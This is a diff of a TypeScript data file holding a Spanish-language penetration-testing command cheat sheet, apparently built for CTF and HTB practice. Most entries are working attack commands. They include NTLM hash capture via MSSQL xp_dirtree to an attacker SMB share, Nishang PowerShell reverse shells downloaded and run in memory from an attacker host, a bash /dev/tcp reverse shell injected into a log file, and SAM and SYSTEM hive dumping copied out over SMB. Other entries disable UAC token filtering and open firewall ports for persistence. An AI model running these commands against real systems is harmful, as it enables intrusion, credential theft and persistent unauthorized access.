     command: '# 1. Montar SMB server en nuestra máquina:\nsudo impacket-smbserver smbfolder $(pwd) -smb2support\n\n# 2. Desde la consola MSSQL forzar autenticación:\nxp_dirtree "\\\\<tu-ip>\\smbfolder\\"\n\n# 3. El hash NTLMv2 aparece en el listener\n# 4. Crackear:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\nhashcat -m 5600 hash.txt rockyou.txt',
     description: 'Técnica para capturar hashes NTLMv2 forzando autenticación de MSSQL contra nuestro SMB server. El servidor SQL intentará conectarse y enviará sus credenciales automáticamente.',
     tags: ['ntlm', 'capture', 'mssql', 'windows', 'lateral-movement'],
@@ -1545,7 +1556,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'impacket-psexec-escape',
     tool: 'impacket', phase: 'post_exploitation', category: 'Lateral Movement',
-    title: 'psexec — escapar caracteres especiales',
+    title: 'psexec - escapar caracteres especiales',
     command: '# Contraseña con ! (escapar con \\!)\npsexec.py WORKGROUP/Administrator:MyPass\\!\\!1\\!@<target> cmd.exe\n\n# Pass-the-hash (pth-winexe alternativo):\npth-winexe -U WORKGROUP/Administrator%<LM:NTLM-HASH> //<target> cmd.exe',
     description: 'Variantes de psexec para contraseñas con caracteres especiales (!, $, etc.) que el shell interpreta. pth-winexe como alternativa para pass-the-hash.',
     tags: ['psexec', 'pth', 'windows', 'lateral-movement'],
@@ -1553,13 +1564,13 @@ const COMANDOS: Comando[] = [
     notes: 'En bash los ! en strings deben escaparse con \\! o usar comillas simples: \'pass!!\'',
   },
 
-  // ── NISHANG — PowerShell Ofensivo ─────────────────────────────────────────
+  // ── NISHANG - PowerShell Ofensivo ─────────────────────────────────────────
   {
     id: 'nishang-reverse',
     tool: 'nishang', phase: 'exploitation', category: 'PowerShell Offensive',
-    title: 'Invoke-PowerShellTcp — reverse shell',
+    title: 'Invoke-PowerShellTcp - reverse shell',
     command: '# 1. Copiar y preparar el script:\ncp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1\n# Agregar al FINAL del archivo:\n# Invoke-PowerShellTcp -Reverse -IPAddress <tu-ip> -Port 443\n\n# 2. Levantar HTTP server:\npython3 -m http.server 80\n\n# 3. Listener:\nrlwrap nc -nlvp 443\n\n# 4. Ejecutar desde el target (PowerShell):\npowershell IEX(New-Object Net.WebClient).downloadString("http://<tu-ip>/shell.ps1")\n\n# O desde xp_cmdshell en MSSQL:\nxp_cmdshell """powershell IEX(New-Object Net.WebClient).downloadString(\'http://<tu-ip>/shell.ps1\')"""',
-    description: 'Reverse shell PowerShell de Nishang. No sube ningún archivo — el script se ejecuta en memoria (fileless). Ideal desde MSSQL xp_cmdshell o cuando se tiene ejecución de comandos Windows.',
+    description: 'Reverse shell PowerShell de Nishang. No sube ningún archivo - el script se ejecuta en memoria (fileless). Ideal desde MSSQL xp_cmdshell o cuando se tiene ejecución de comandos Windows.',
     tags: ['powershell', 'reverse-shell', 'windows', 'fileless'],
     mitreId: 'T1059',
     notes: 'Si PowerShell está en 32-bit usar la ruta nativa: C:\\Windows\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe',
@@ -1588,7 +1599,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'powersploit-powerup',
     tool: 'powersploit', phase: 'post_exploitation', category: 'Windows PrivEsc',
-    title: 'PowerUp — Invoke-AllChecks',
+    title: 'PowerUp - Invoke-AllChecks',
     command: '# Desde tu máquina: agregar al final del archivo PowerUp.ps1:\n# Invoke-AllChecks\n\n# Servir y ejecutar en el target:\npython3 -m http.server 80\nIEX(New-Object Net.WebClient).downloadString("http://<tu-ip>/PowerUp.ps1")\n\n# Buscar en la salida:\n# - Cached GPP Files (credenciales en GPO)\n# - Unquoted Service Paths\n# - Modifiable Service Binaries\n# - AlwaysInstallElevated',
     description: 'PowerUp es el módulo de escalación de privilegios de PowerSploit. Invoke-AllChecks revisa todas las vías conocidas: servicios vulnerables, credenciales cacheadas en GPP, AlwaysInstallElevated, paths sin comillas, etc.',
     tags: ['privesc', 'windows', 'powershell', 'gpp', 'services'],
@@ -1608,7 +1619,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'powersploit-powerview',
     tool: 'powersploit', phase: 'recon', category: 'AD Enumeration',
-    title: 'PowerView — enumerar Active Directory',
+    title: 'PowerView - enumerar Active Directory',
     command: 'IEX(New-Object Net.WebClient).downloadString("http://<tu-ip>/PowerView.ps1")\n\n# Enumerar el dominio:\nGet-Domain\nGet-DomainUser | select name, description, memberof\nGet-DomainGroup -Name "Domain Admins" | select member\nGet-DomainComputer | select dnshostname, operatingsystem\nGet-DomainGPO | select displayname\nFind-LocalAdminAccess  # Hosts donde el usuario actual es local admin',
     description: 'PowerView es la herramienta de enumeración AD de PowerSploit. Alternativa a BloodHound para entender la estructura del dominio desde una shell ya comprometida.',
     tags: ['ad', 'enum', 'powershell', 'domain', 'recon'],
@@ -1616,11 +1627,11 @@ const COMANDOS: Comando[] = [
     notes: 'Parte de PowerSploit: https://github.com/PowerShellMafia/PowerSploit. Requiere una sesión de dominio.',
   },
 
-  // ── WINDOWS BUILT-INS — Técnicas post-compromiso ─────────────────────────
+  // ── WINDOWS BUILT-INS - Técnicas post-compromiso ─────────────────────────
   {
     id: 'win-whoami-priv',
     tool: 'windows-builtins', phase: 'post_exploitation', category: 'Enumeración Local',
-    title: 'whoami — privelegios y grupos',
+    title: 'whoami - privelegios y grupos',
     command: 'whoami\nwhoami /priv     # Listar privilegios habilitados\nwhoami /groups   # Grupos del usuario actual\nwhoami /all      # Todo: usuario + grupos + privilegios',
     description: 'Enumeración básica del usuario actual. whoami /priv muestra privilegios como SeImpersonatePrivilege (Potato attacks), SeBackupPrivilege (leer archivos protegidos), SeLoadDriverPrivilege.',
     tags: ['windows', 'enum', 'privesc', 'privileges'],
@@ -1630,7 +1641,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'win-certutil-transfer',
     tool: 'windows-builtins', phase: 'post_exploitation', category: 'File Transfer',
-    title: 'certutil — transferencia de archivos',
+    title: 'certutil - transferencia de archivos',
     command: '# Descargar archivo desde HTTP:\ncertutil.exe -f -urlcache -split http://<tu-ip>/nc.exe C:\\Windows\\Temp\\nc.exe\n\n# Codificar archivo en base64 (para exfiltrar):\ncertutil.exe -encode C:\\ruta\\archivo.txt encoded.b64\n\n# Decodificar:\ncertutil.exe -decode encoded.b64 output.txt',
     description: 'certutil es un binario legítimo de Windows (LOLBAS) usado para transferir archivos sin herramientas adicionales. Muy útil cuando no se puede usar PowerShell o wget. También permite codificar/decodificar base64.',
     tags: ['windows', 'file-transfer', 'lolbas', 'certutil'],
@@ -1650,7 +1661,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'win-net-commands',
     tool: 'windows-builtins', phase: 'post_exploitation', category: 'Enumeración Local',
-    title: 'net — enumerar usuarios, grupos y shares',
+    title: 'net - enumerar usuarios, grupos y shares',
     command: 'net user                          # Listar usuarios locales\nnet user <username>               # Detalle de un usuario\nnet localgroup                    # Listar grupos locales\nnet localgroup Administrators     # Miembros del grupo\nnet share                         # Shares activos\nnet view \\\\<target>              # Shares de otro host\nnet accounts                      # Política de contraseñas',
     description: 'Comandos net para enumeración rápida en sistemas Windows sin necesitar herramientas externas. Disponible en cualquier Windows desde Windows NT.',
     tags: ['windows', 'enum', 'users', 'shares', 'lolbas'],
@@ -1659,19 +1670,19 @@ const COMANDOS: Comando[] = [
   {
     id: 'win-python-shell-upgrade',
     tool: 'windows-builtins', phase: 'post_exploitation', category: 'Shell Upgrade',
-    title: 'Shell upgrade — PTY interactiva',
-    command: '# Linux — Python (el más confiable):\npython3 -c "import pty;pty.spawn(\'/bin/bash\')"\npython -c "import pty;pty.spawn(\'/bin/bash\')"\n\n# Luego para tty completa:\n# Ctrl+Z (background)\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 40 columns 180\n\n# Alternativa con script:\nscript /dev/null -c bash\n\n# Listener mejorado con rlwrap (historial, flechas):\nrlwrap nc -nlvp 443',
+    title: 'Shell upgrade - PTY interactiva',
+    command: '# Linux - Python (el más confiable):\npython3 -c "import pty;pty.spawn(\'/bin/bash\')"\npython -c "import pty;pty.spawn(\'/bin/bash\')"\n\n# Luego para tty completa:\n# Ctrl+Z (background)\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 40 columns 180\n\n# Alternativa con script:\nscript /dev/null -c bash\n\n# Listener mejorado con rlwrap (historial, flechas):\nrlwrap nc -nlvp 443',
     description: 'Mejorar una reverse shell básica a una TTY interactiva completa. Permite usar Ctrl+C sin matar la sesión, historial de comandos, autocompletado y editores como vim/nano.',
     tags: ['shell', 'pty', 'linux', 'tty', 'upgrade'],
     mitreId: 'T1059',
     notes: 'rlwrap nc da historial de comandos incluso sin upgradear la shell. Instalar: apt install rlwrap',
   },
 
-  // ── BASH SCRIPTS — Reconocimiento propio ─────────────────────────────────
+  // ── BASH SCRIPTS - Reconocimiento propio ─────────────────────────────────
   {
     id: 'bash-ping-sweep',
     tool: 'bash-scripts', phase: 'recon', category: 'Host Discovery',
-    title: 'Ping sweep — descubrir hosts activos',
+    title: 'Ping sweep - descubrir hosts activos',
     command: '#!/bin/bash\n# Uso: bash ipscan.sh\nfor i in $(seq 1 255); do\n  timeout 1 bash -c "ping -c 1 10.10.10.$i" > /dev/null && echo "10.10.10.$i - Activo" &\ndone; wait',
     description: 'Script bash para descubrir hosts activos en una /24 usando ICMP. Lanza todos los pings en paralelo con & y espera resultados. Alternativa liviana a nmap -sn cuando no se tiene nmap.',
     tags: ['bash', 'ping', 'host-discovery', 'recon', 'icmp'],
@@ -1681,18 +1692,18 @@ const COMANDOS: Comando[] = [
   {
     id: 'bash-port-scan',
     tool: 'bash-scripts', phase: 'recon', category: 'Port Scanning',
-    title: 'Port scanner — sin nmap',
+    title: 'Port scanner - sin nmap',
     command: '#!/bin/bash\n# Uso: bash portscan.sh <ip>\ntrap ctrl_c INT\nfunction ctrl_c() { echo -e "\\n[*] Saliendo...\\n"; tput cnorm; exit 0; }\n\ntput civis\nfor port in $(seq 1 65535); do\n  timeout 1 bash -c "echo > /dev/tcp/$1/$port" 2>/dev/null && echo "Puerto $port - ABIERTO" &\ndone; wait\ntput cnorm',
     description: 'Port scanner puro en bash usando /dev/tcp. Útil en entornos donde nmap no está disponible (contenedores, sistemas embebidos, CTF con restricciones). Más lento que nmap pero no requiere herramientas externas.',
     tags: ['bash', 'port-scan', 'recon', 'no-tools'],
     mitreId: 'T1595',
-    notes: '/dev/tcp es una feature de bash — no funciona en sh o dash. Pasar la IP como argumento: bash portscan.sh 10.10.10.5',
+    notes: '/dev/tcp es una feature de bash - no funciona en sh o dash. Pasar la IP como argumento: bash portscan.sh 10.10.10.5',
   },
   {
     id: 'bash-os-ttl',
     tool: 'bash-scripts', phase: 'recon', category: 'OS Detection',
     title: 'OS detection por TTL (ping)',
-    command: '# Método rápido — leer TTL del ping:\nping -c 1 <target> | grep ttl\n# TTL ~64  → Linux/Unix\n# TTL ~128 → Windows\n# TTL ~254 → Cisco/Solaris\n\n# Script Python — detección automática:\n#!/usr/bin/env python3\nimport subprocess, re, sys\ndef get_os(ip):\n    out = subprocess.check_output(["ping","-c","1",ip]).decode()\n    ttl = int(re.search(r"ttl=(\\d+)", out).group(1))\n    if ttl <= 64: return "Linux/Unix"\n    elif ttl <= 128: return "Windows"\n    else: return "Cisco/Solaris"\nprint(get_os(sys.argv[1]))',
+    command: '# Método rápido - leer TTL del ping:\nping -c 1 <target> | grep ttl\n# TTL ~64  → Linux/Unix\n# TTL ~128 → Windows\n# TTL ~254 → Cisco/Solaris\n\n# Script Python - detección automática:\n#!/usr/bin/env python3\nimport subprocess, re, sys\ndef get_os(ip):\n    out = subprocess.check_output(["ping","-c","1",ip]).decode()\n    ttl = int(re.search(r"ttl=(\\d+)", out).group(1))\n    if ttl <= 64: return "Linux/Unix"\n    elif ttl <= 128: return "Windows"\n    else: return "Cisco/Solaris"\nprint(get_os(sys.argv[1]))',
     description: 'Identificar el sistema operativo de forma no invasiva analizando el TTL en la respuesta ICMP. Linux usa TTL 64, Windows 128, Cisco/Solaris 254. Los valores reales son menores por los saltos de red.',
     tags: ['os-detection', 'ttl', 'ping', 'icmp', 'recon', 'passive'],
     mitreId: 'T1592',
@@ -1701,12 +1712,144 @@ const COMANDOS: Comando[] = [
   {
     id: 'bash-log-injection',
     tool: 'bash-scripts', phase: 'exploitation', category: 'Injection Techniques',
-    title: 'Log injection — reverse shell via archivo de log',
+    title: 'Log injection - reverse shell via archivo de log',
     command: '# Si un script externo lee un log y ejecuta su contenido:\n# 1. Dejar listener en escucha:\nnc -nlvp 4444\n\n# 2. Inyectar reverse shell en el log (el espacio al inicio es intencional):\necho "  ;/bin/bash -c \'bash -i >& /dev/tcp/<tu-ip>/4444 0>&1\' #" >> /ruta/del/logfile\n\n# El script externo al procesar la línea ejecutará el comando inyectado',
     description: 'Técnica de inyección cuando un proceso externo (cron job, script de monitoreo) lee un archivo que podemos escribir y ejecuta su contenido. El punto y coma separa comandos, el # comenta el resto de la línea para evitar errores.',
     tags: ['injection', 'log-injection', 'linux', 'privesc', 'lateral-movement'],
     mitreId: 'T1574',
     notes: 'Verificar si el script tiene SUID o si corre como root/otro usuario. Revisar con: sudo -l, crontab -l, /etc/cron.*',
+  },
+
+  // ── TSHARK ────────────────────────────────────────────────────────────────────
+  {
+    id: 'tshark-capture-live',
+    tool: 'tshark', phase: 'recon', category: 'Traffic Analysis',
+    title: 'Captura de tráfico en tiempo real',
+    command: '# Capturar todo el tráfico de la interfaz tun0 y guardar a archivo:\nsudo tshark -i tun0 -w captura.pcapng\n\n# Capturar solo tráfico HTTP:\nsudo tshark -i tun0 -f "tcp port 80" -w captura_http.pcapng\n\n# Ver resumen en pantalla (sin guardar):\nsudo tshark -i tun0',
+    description: 'TShark es la versión CLI de Wireshark. Permite capturar tráfico de red en tiempo real o analizar capturas guardadas. Muy útil para monitorear qué envía un script nmap o un exploit antes de ejecutarlo en producción.',
+    tags: ['tshark', 'traffic', 'capture', 'wireshark', 'network', 'recon'],
+    mitreId: 'T1040',
+    notes: 'Requiere privilegios root o pertenecer al grupo wireshark. Instalar: apt install tshark',
+  },
+  {
+    id: 'tshark-analyze-pcap',
+    tool: 'tshark', phase: 'recon', category: 'Traffic Analysis',
+    title: 'Analizar captura - filtrar tráfico HTTP',
+    command: '# Ver tráfico HTTP hacia un destino específico:\ntshark -r captura.pcapng -Y "ip.dst==<target> && http" 2>/dev/null\n\n# Ver en formato JSON estructurado:\ntshark -r captura.pcapng -Y "ip.dst==<target> && http" -Tjson 2>/dev/null\n\n# Ver solo el payload TCP (lo que manda el script):\ntshark -r captura.pcapng -Y "ip.dst==<target> && http" -Tfields -e tcp.payload 2>/dev/null\n\n# Decodificar payload hex a texto legible:\ntshark -r captura.pcapng -Y "ip.dst==<target> && http" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r | less',
+    description: 'Analizar una captura guardada para ver exactamente qué tráfico genera un script o herramienta. Útil para entender el comportamiento de nmap NSE scripts, exploits, o detectar qué envía un payload antes de usarlo en un engagement real.',
+    tags: ['tshark', 'pcap', 'analysis', 'http', 'payload', 'xxd'],
+    mitreId: 'T1040',
+    notes: 'El filtro -Y usa sintaxis de display filter de Wireshark. xxd -ps -r convierte hex a texto legible. Útil combinado con tcpdump -w para capturar.',
+  },
+
+  // ── SEARCHSPLOIT ──────────────────────────────────────────────────────────────
+  {
+    id: 'searchsploit-basic',
+    tool: 'searchsploit', phase: 'scanning', category: 'Exploit Discovery',
+    title: 'Buscar exploits en ExploitDB (offline)',
+    command: '# Búsqueda básica por servicio y versión:\nsearchsploit <servicio> <versión>\n# Ejemplo:\nsearchsploit "http file server" 2.3\nsearchsploit hfs 2.3\n\n# Si da falso negativo, probar variantes del nombre:\nsearchsploit httpfileserver\nsearchsploit "http file server"\nsearchsploit hfs\n\n# Buscar solo en títulos (más preciso):\nsearchsploit -t apache 2.4',
+    description: 'Busca exploits en la base de datos local de ExploitDB sin conexión a Internet. Importante: buscar con variantes del nombre del servicio ya que la búsqueda es literal y puede dar falsos negativos. Si no encuentra con "HttpFileServer 2.3", probar "hfs", "http file server", etc.',
+    tags: ['searchsploit', 'exploitdb', 'exploit', 'scanning', 'enumeration'],
+    mitreId: 'T1588',
+    notes: 'Actualizar la base de datos con: searchsploit -u. Copiar un exploit al directorio actual: searchsploit -m <id>. Ver en menos formato: searchsploit -w <término> (muestra URL de EDB).',
+  },
+  {
+    id: 'searchsploit-copy-inspect',
+    tool: 'searchsploit', phase: 'exploitation', category: 'Exploit Discovery',
+    title: 'Copiar e inspeccionar exploit',
+    command: '# Copiar exploit al directorio de trabajo:\nsearchsploit -m <exploit-id>\n# Ejemplo:\nsearchsploit -m 39161\n\n# Ver encabezado del exploit para entender su uso:\nhead -n 30 39161.py\n\n# Determinar si es Python 2 o Python 3 rápidamente:\ncat exploit.py | head -n 1\n# Python 2: #!/usr/bin/env python\n# Python 3: #!/usr/bin/env python3\n\n# Si es Python 2 con print sin paréntesis, ejecutar con:\npython2 exploit.py <args>',
+    description: 'Flujo completo para usar un exploit de searchsploit: copiar al directorio de trabajo, leer el encabezado para ver los argumentos requeridos, y determinar la versión de Python. Muchos exploits viejos de HTB/CTF son Python 2.',
+    tags: ['searchsploit', 'exploit', 'python2', 'python3'],
+    mitreId: 'T1588',
+    notes: 'Siempre leer el código fuente antes de ejecutar un exploit. Los exploits de EDB suelen tener los argumentos explicados en los primeros 30 líneas.',
+  },
+
+  // ── SMBMAP ────────────────────────────────────────────────────────────────────
+  {
+    id: 'smbmap-enum',
+    tool: 'smbmap', phase: 'recon', category: 'SMB Enumeration',
+    title: 'Enumerar recursos compartidos SMB',
+    command: '# Enumerar shares sin credenciales (acceso anónimo):\nsmbmap -H <target>\n\n# Con credenciales:\nsmbmap -H <target> -u <usuario> -p <password>\n\n# Con hash (pass-the-hash):\nsmbmap -H <target> -u <usuario> -p <LM:NTLM>\n\n# Listar contenido de un share específico:\nsmbmap -H <target> -u <usuario> -p <password> -r <sharename>\n\n# Buscar archivos por extensión:\nsmbmap -H <target> -u <usuario> -p <password> -R --depth 5 -A ".txt|.xml|.conf"',
+    description: 'smbmap enumera recursos compartidos SMB mostrando permisos (READ/WRITE/NO ACCESS). Más informativo que smbclient -L porque muestra directamente los permisos de acceso. Útil para identificar shares con acceso de escritura o lectura sin autenticación.',
+    tags: ['smb', 'smbmap', 'enumeration', 'windows', 'shares', 'recon'],
+    mitreId: 'T1135',
+    notes: 'Si smbmap -H da "Authentication error", probar con -u "" -p "" (usuario vacío explícito). smbmap + smbclient son complementarios: smbmap para permisos, smbclient para navegar.',
+  },
+
+  // ── NMAP COMPLEMENTARIOS ──────────────────────────────────────────────────────
+  {
+    id: 'nmap-http-enum',
+    tool: 'nmap', phase: 'scanning', category: 'Scripts NSE',
+    title: 'http-enum - descubrimiento de directorios y rutas web',
+    command: '# Mini fuzzing de directorios/rutas web con NSE:\nnmap --script http-enum -p80 <target> -oN webScan\n\n# Con HTTPS:\nnmap --script http-enum -p443 --script-args "http-enum.basepath=/" <target>\n\n# Múltiples puertos web:\nnmap --script http-enum -p80,443,8080,8443 <target>\n\n# Ver qué hace el script antes de lanzarlo (opcional - con tshark):\nsudo tshark -i tun0 -w captura -v &\nnmap --script http-enum -p80 <target>\nkill %1',
+    description: 'El script http-enum de nmap realiza un mini-fuzzing de directorios y rutas web comunes sin necesidad de ffuf o gobuster. Más lento pero silencioso y sin dependencias adicionales. Guarda resultado con -oN para análisis posterior.',
+    tags: ['nmap', 'nse', 'http-enum', 'web', 'directory', 'fuzzing'],
+    mitreId: 'T1595',
+    notes: 'Localizar el script: locate http-enum.nse. Para un fuzzing más profundo usar ffuf o gobuster. http-enum usa una wordlist interna reducida (~500 rutas comunes).',
+  },
+  {
+    id: 'nmap-grepable-extractports',
+    tool: 'nmap', phase: 'scanning', category: 'Port Scanning',
+    title: 'Scan greapeable + extracción de puertos (extractPorts)',
+    command: '# 1. Scan con salida grepeable:\nnmap -p- --top-ports 5000 --open -T5 -v -n <target> -oG top5000Ports\n\n# 2. Ver puertos abiertos del resultado:\ncat top5000Ports | grep -oP \'\\d{1,5}/open\'\n\n# 3. Extraer puertos en formato CSV para pasar a nmap -p:\nports=$(cat top5000Ports | grep -oP \'\\d{1,5}/open\' | cut -d/ -f1 | tr \'\\n\' \',\' | sed \'s/,$//\')\necho $ports\n\n# 4. Segundo scan en profundidad sobre solo esos puertos:\nnmap -sC -sV -p$ports <target> -oN targeted',
+    description: 'Flujo optimizado: primer scan rápido con salida grepeable (-oG) para descubrir puertos abiertos, luego extraer esos puertos en formato CSV y hacer un segundo scan con scripts y versiones (-sC -sV) solo sobre los puertos relevantes. Evita scanear 65535 puertos en profundidad.',
+    tags: ['nmap', 'grepeable', 'extractports', 'workflow', 'scanning'],
+    mitreId: 'T1595',
+    notes: 'El formato -oG permite parsear con grep/awk. La variable extractPorts en bspwm/zshrc automatiza este paso 3. El flag -v muestra puertos a medida que se descubren, útil en scans largos.',
+  },
+
+  // ── WINDOWS PRIVESC TOOLS ─────────────────────────────────────────────────────
+  {
+    id: 'wesng-vuln-scan',
+    tool: 'win-privesc-tools', phase: 'post_exploitation', category: 'Windows PrivEsc',
+    title: 'wes-ng - Windows Exploit Suggester NG',
+    command: '# 1. Obtener systeminfo en la víctima y copiar a un archivo:\nsysteminfo > systeminfo.txt\n# (copiar el contenido al equipo atacante)\n\n# 2. Clonar wes-ng:\ngit clone https://github.com/bitsadmin/wesng\ncd wesng\n\n# 3. Actualizar base de datos de CVEs:\npython wes.py --update\n\n# 4. Escanear:\npython wes.py /ruta/systeminfo.txt\n\n# 5. Filtrar solo Elevation of Privilege:\npython wes.py /ruta/systeminfo.txt -i "Elevation of Privilege"\n\n# 6. Excluir vulnerabilidades ya parcheadas:\npython wes.py /ruta/systeminfo.txt --missing-only',
+    description: 'WES-NG compara la salida de systeminfo con la base de datos de boletines de seguridad de Microsoft para identificar parches faltantes y vulnerabilidades conocidas. Más preciso que windows-exploit-suggester clásico. Requiere exportar systeminfo.txt desde la víctima.',
+    tags: ['windows', 'privesc', 'wesng', 'systeminfo', 'cve', 'privilege-escalation'],
+    mitreId: 'T1068',
+    notes: 'La salida puede incluir falsos positivos (marca vuln aunque el software no esté instalado). Cruzar con la realidad del sistema. Para W10/W11 moderno con pocos parches faltantes, preferir winPEAS.',
+  },
+  {
+    id: 'windows-exploit-suggester',
+    tool: 'win-privesc-tools', phase: 'post_exploitation', category: 'Windows PrivEsc',
+    title: 'Windows Exploit Suggester (clásico)',
+    command: '# 1. Clonar:\ngit clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester\ncd Windows-Exploit-Suggester\n\n# 2. Instalar dependencia:\npip install xlrd==1.2.0\n\n# 3. Actualizar base de datos:\npython windows-exploit-suggester.py --update\n# Genera archivo: YYYY-MM-DD-mssb.xls\n\n# 4. Exportar systeminfo desde la víctima:\nsysteminfo > systeminfo.txt\n\n# 5. Escanear:\npython windows-exploit-suggester.py --database 2021-06-01-mssb.xls --systeminfo systeminfo.txt\n\n# 6. Filtrar por Elevation of Privilege:\npython windows-exploit-suggester.py --database mssb.xls --systeminfo systeminfo.txt | grep -i "local privilege"',
+    description: 'Windows Exploit Suggester clásico (AonCyberLabs). Compara systeminfo con base de datos XLS de boletines Microsoft. Indica exploits públicos (E) y módulos Metasploit (M) disponibles. Importante: puede dar falsos positivos para servicios no instalados (IIS, etc.).',
+    tags: ['windows', 'privesc', 'exploit-suggester', 'systeminfo', 'privilege-escalation'],
+    mitreId: 'T1068',
+    notes: 'La columna E indica exploit público disponible, M indica módulo de Metasploit. Siempre verificar que el servicio o componente marcado esté realmente instalado antes de intentar el exploit.',
+  },
+
+  // ── WINDOWS POST-EXPLOTACIÓN MANUAL ──────────────────────────────────────────
+  {
+    id: 'win-sysnative-ps64',
+    tool: 'win-post-manual', phase: 'post_exploitation', category: 'PowerShell',
+    title: 'Salto a PowerShell 64-bit via SysNative',
+    command: '# Verificar si el proceso actual es 64-bit:\n[Environment]::Is64BitProcess\n# false = proceso 32-bit (da falsos positivos en privesc tools)\n\n# Saltar a PowerShell nativo de 64-bit desde cmd/shell de 32-bit:\nstart /b C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -c "whoami"\n\n# Cargar script en memoria desde SysNative PS:\nstart /b C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe IEX(New-Object Net.Webclient).DownloadString(\'http://<tu-ip>/script.ps1\')\n\n# Verificar que ahora sí es 64-bit:\n[Environment]::Is64BitOperatingSystem\n[Environment]::Is64BitProcess\n# Ambos deben devolver true',
+    description: 'En Windows de 64-bit con proceso de 32-bit (common cuando HFS/app web es 32-bit), herramientas como PowerSploit dan falsos positivos. SysNative es una carpeta virtual que redirige a System32 de 64-bit desde procesos de 32-bit. Necesario para usar PowerUp, WinPEAS y otras herramientas de privesc correctamente.',
+    tags: ['windows', 'sysnative', 'powershell', '64bit', 'privesc', 'process'],
+    mitreId: 'T1059',
+    notes: 'SysNative solo existe en Windows 64-bit. C:\\Windows\\System32 = DLLs 64-bit. C:\\Windows\\SysWOW64 = DLLs 32-bit. Sysnative = alias para System32 accesible desde procesos 32-bit.',
+  },
+  {
+    id: 'win-sam-hash-extraction',
+    tool: 'win-post-manual', phase: 'post_exploitation', category: 'Credential Dumping',
+    title: 'Extracción de hashes SAM via registro (sin herramientas)',
+    command: '# 1. Hacer backup del SAM y SYSTEM desde la víctima (requiere SYSTEM):\nreg save HKLM\\SAM SAM.backup\nreg save HKLM\\SYSTEM SYSTEM.backup\n\n# 2. Copiar al equipo atacante via SMB:\n# En atacante:\nsudo impacket-smbserver smbFolder $(pwd) -smb2support\n# En víctima:\ncopy SAM.backup \\\\<tu-ip>\\smbFolder\\SAM\ncopy SYSTEM.backup \\\\<tu-ip>\\smbFolder\\SYSTEM\n\n# 3. Extraer hashes offline con secretsdump:\nimpacket-secretsdump -sam SAM -system SYSTEM LOCAL\n\n# 4. Crackear hashes NTLM:\nhashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt\njohn --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt',
+    description: 'Método manual para extraer hashes sin herramientas adicionales en la víctima - solo usa reg.exe nativo de Windows. Los archivos SAM y SYSTEM están bloqueados mientras el SO los usa, por eso se hace backup vía registro. Luego se extraen offline con secretsdump.',
+    tags: ['windows', 'sam', 'hashes', 'registry', 'credential-dumping', 'ntlm', 'offline'],
+    mitreId: 'T1003',
+    notes: 'Requiere privilegios de SYSTEM o Administrador. reg save crea un backup del hive del registro que no está bloqueado como el archivo original. Para W10 con Credential Guard activo, este método puede no funcionar.',
+  },
+  {
+    id: 'win-net-share-grant',
+    tool: 'win-post-manual', phase: 'post_exploitation', category: 'Persistence',
+    title: 'Crear recurso compartido con permisos + LocalAccountTokenFilter',
+    command: '# 1. Crear recurso compartido con permisos FULL para Administrators:\nnet share attacker_folder=C:\\Windows\\Temp /GRANT:Administrators,FULL\n\n# 2. Verificar que el puerto 445 está accesible:\nnmap -p445 --open -T5 -v -n <victima>\n\n# 3. Si psexec.py sigue sin acceso, deshabilitar el filtro de token UAC:\n# (Permite que cuentas locales tengan token completo via red)\ncmd /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n\n# 4. Abrir puerto SMB en firewall si está bloqueado:\nnetsh advfirewall firewall add rule name="SMB" protocol=TCP dir=in localport=445 action=allow\nnetsh advfirewall firewall add rule name="SMB" protocol=TCP dir=out localport=445 action=allow\n\n# 5. Ahora conectar con psexec.py:\npython3 psexec.py WORKGROUP/<usuario>:<password>@<victima>',
+    description: 'Flujo completo para establecer acceso SMB persistente post-explotación. LocalAccountTokenFilterPolicy=1 es el cambio crítico: por defecto Windows filtra el token de cuentas locales en conexiones de red (aunque sean admin), con este registro se deshabilita ese filtro.',
+    tags: ['windows', 'smb', 'persistence', 'net-share', 'uac', 'token-filter', 'psexec'],
+    mitreId: 'T1134',
+    notes: 'LocalAccountTokenFilterPolicy solo afecta cuentas locales, no de dominio. Con dominio, las cuentas admin ya tienen token completo via red. Este valor en registro sobrevive reinicios.',
   },
 
   // ── GOOGLE DORKS ──────────────────────────────────────────────────────────────
@@ -1742,15 +1885,15 @@ const COMANDOS: Comando[] = [
     tool: 'google-dorks', phase: 'recon', category: 'Fingerprinting',
     title: 'robots.txt, configs y archivos sensibles',
     command: '# Ver robots.txt de un sitio (manual):\nhttps://target.com/robots.txt\n\n# Dorks para archivos sensibles:\nsite:target.com filetype:env\nsite:target.com filetype:conf\nsite:target.com filetype:bak\nsite:target.com ext:log\nsite:target.com "Index of /"',
-    description: 'robots.txt revela directorios que el dueño no quiere que Google indexe — exactamente lo que nos interesa. También buscar archivos de configuración, backups y logs indexados por error.',
+    description: 'robots.txt revela directorios que el dueño no quiere que Google indexe - exactamente lo que nos interesa. También buscar archivos de configuración, backups y logs indexados por error.',
     tags: ['dork', 'google', 'robots.txt', 'config', 'sensitive-files', 'recon'],
     mitreId: 'T1593',
-    notes: 'Index of / indica directory listing habilitado — posible acceso directo a archivos del servidor.',
+    notes: 'Index of / indica directory listing habilitado - posible acceso directo a archivos del servidor.',
   },
   {
     id: 'dork-shodan',
     tool: 'google-dorks', phase: 'recon', category: 'OSINT',
-    title: 'Shodan dorks — dispositivos y servicios expuestos',
+    title: 'Shodan dorks - dispositivos y servicios expuestos',
